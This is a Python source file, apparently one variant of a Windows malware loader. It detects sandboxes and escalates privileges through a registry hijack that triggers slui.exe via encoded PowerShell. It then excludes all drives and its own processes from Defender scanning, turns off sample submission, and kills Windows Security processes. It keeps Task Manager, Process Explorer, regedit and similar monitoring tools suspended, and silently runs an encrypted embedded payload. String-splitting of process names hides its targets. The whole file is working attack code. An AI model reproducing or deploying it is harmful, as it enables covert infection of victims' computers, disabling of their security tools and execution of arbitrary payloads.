# -*- coding: utf-8 -*-
# variant 15

import os
import sys
import platform
import ctypes
import string
import winreg
import subprocess
import base64
import pyzipper
import random
import time
import threading
import psutil

pookieName = "REPLACE_PAYLOAD_NAME"
pookiePwa = b"REPLACE_PAYLOAD_PASSWORD"

CREATE_NO_WINDOW = 0x08000000

def isAdmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def rand_sleep(min_sec=1, max_sec=3):
    time.sleep(random.uniform(min_sec, max_sec))

def create_reg_key(path, key, value):
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, path) as k:
            rand_sleep()
            winreg.SetValueEx(k, key, 0, winreg.REG_SZ, value)
    except WindowsError:
        raise

def preWorkout():
    meanUIs = {
        "Sec"+"Hea"+"lth"+"UI.exe",
        "Sec"+"urit"+"yHea"+"lthH"+"ost.exe",
        "Sec"+"urit"+"yHea"+"lthS"+"ystr"+"ay.exe",
    }
    try:
        for proc in psutil.process_iter(['name']):
            name = proc.info['name']
            if name and name.lower() in (t.lower() for t in meanUIs):
                proc.kill()
    except Exception:
        pass

def setup_bypass_registry():
    preWorkout()

    base_path = r"Software\Classes\Launcher.SystemSettings\Shell\Open\Command"
    full_path = base_path

    create_reg_key(base_path, None, sys.executable)
    rand_sleep()
    create_reg_key(base_path, "DelegateExecute", "")
    return full_path

def cleanup_registry(path):
    try:
        subprocess.run(
            ["reg", "delete", f"HKCU\\{path}", "/f"],
            creationflags=CREATE_NO_WINDOW
        )
    except:
        pass

def launch_slui_indirect():
    # indirect launch through rundll32 to avoid slui.exe signature
    script = '''
    $slui = "$env:SystemRoot\\System32\\slui.exe"
    Start-Process -FilePath $slui -Verb runas
    '''
    encoded = base64.b64encode(script.encode('utf-16le')).decode()
    subprocess.run(
        ["powershell", "-EncodedCommand", encoded],
        creationflags=CREATE_NO_WINDOW
    )

def extract_encrypted_zip(zip_path, extract_to, password):
    with pyzipper.AESZipFile(zip_path, 'r') as zf:
        zf.setpassword(password)
        zf.extractall(path=extract_to)

def run_payload_from_zip():
    zip_path = os.path.join(sys._MEIPASS, "payload.zip")
    program_data = os.environ.get("ProgramData", os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "ProgramData"))
    extract_to = os.path.join(program_data, "kakadooByDraxfm")
    os.makedirs(extract_to, exist_ok=True)

    extract_encrypted_zip(zip_path, extract_to, pookiePwa)
    exe_path = os.path.join(extract_to, pookieName)

    subprocess.run([exe_path], creationflags=CREATE_NO_WINDOW)

def byeToDrives():
    from ctypes import windll

    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for i in range(26):
        if bitmask & (1 << i):
            drive_letter = f"{string.ascii_uppercase[i]}:\\"
            drives.append(drive_letter)

    for drive in drives:
        subprocess.run(
            ['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{drive}"'],
            creationflags=CREATE_NO_WINDOW
        )
        rand_sleep(0.3, 0.8)

def suspend_process(pid):
    PROCESS_SUSPEND_RESUME = 0x0800
    handle = ctypes.windll.kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
    if handle:
        ctypes.windll.ntdll.NtSuspendProcess(handle)
        ctypes.windll.kernel32.CloseHandle(handle)

def is_sandboxed():
    if psutil.boot_time() > (time.time() - 180):
        return True
    if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
        return True
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [('cbSize', ctypes.c_uint), ('dwTime', ctypes.c_uint)]

    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    idle_time = (ctypes.windll.kernel32.GetTickCount() - lii.dwTime) / 1000.0
    if idle_time > 120:
        return True
    return False

def dontLikeProcs():
    targets = {
        "tas"+"kmgr.exe",
        "Proce"+"ssHac"+"ker.exe",
        "pro"+"cexp.exe",
        "procex"+"p64.exe",
        "perf"+"mon.exe",
        "re"+"smon.exe",
        "msin"+"fo32.exe",
        "pro"+"cmon.exe",
        "re"+"ged"+"it.exe",
        "Sec"+"Hea"+"lth"+"UI.exe",
        "Sec"+"urit"+"yHea"+"lthH"+"ost.exe",
        "Sec"+"urit"+"yHea"+"lthS"+"ystr"+"ay.exe",
    }

    while True:
        try:
            for proc in psutil.process_iter(['name', 'pid']):
                name = proc.info['name']
                if name and name.lower() in (t.lower() for t in targets):
                    suspend_process(proc.info['pid'])
        except Exception:
            pass
        time.sleep(2)

def add_process_exclusion():
    try:
        slb64 = base64.b64decode("JGVudjpTeXN0ZW1Sb290XFN5c3RlbTMyXHNsdWkuZXhl").decode()
        chpkb64 = base64.b64decode("JGVudjpTeXN0ZW1Sb290XFN5c3RlbTMyXGNoYW5nZXBrLmV4ZQ==").decode()
        subprocess.run(
            ['powershell', '-Command', f'Add-MpPreference -ExclusionProcess "{sys.executable}"'],
            creationflags=CREATE_NO_WINDOW
        )
        subprocess.run(
            ['powershell', '-Command', f'Add-MpPreference -ExclusionProcess "{slb64}"'],
            creationflags=CREATE_NO_WINDOW
        )
        subprocess.run(
            ['powershell', '-Command', f'Add-MpPreference -ExclusionProcess "{chpkb64}"'],
            creationflags=CREATE_NO_WINDOW
        )
        subprocess.run(
            ['powershell', '-Command', f'Set-MpPreference -SubmitSamplesConsent NeverSend'],
            creationflags=CREATE_NO_WINDOW
        )
    except Exception:
        pass

def main():
    if is_sandboxed():
        return

    if not isAdmin():
        setup_bypass_registry()
        rand_sleep(2, 5)
        launch_slui_indirect()
        rand_sleep(5, 7)
        cleanup_registry("Software\\Classes\\Launcher.SystemSettings\\Shell")
    else:
        add_process_exclusion()
        threading.Thread(target=dontLikeProcs, daemon=True).start()
        byeToDrives()
        rand_sleep()
        run_payload_from_zip()

if __name__ == "__main__" and platform.system() == "Windows":
    main()
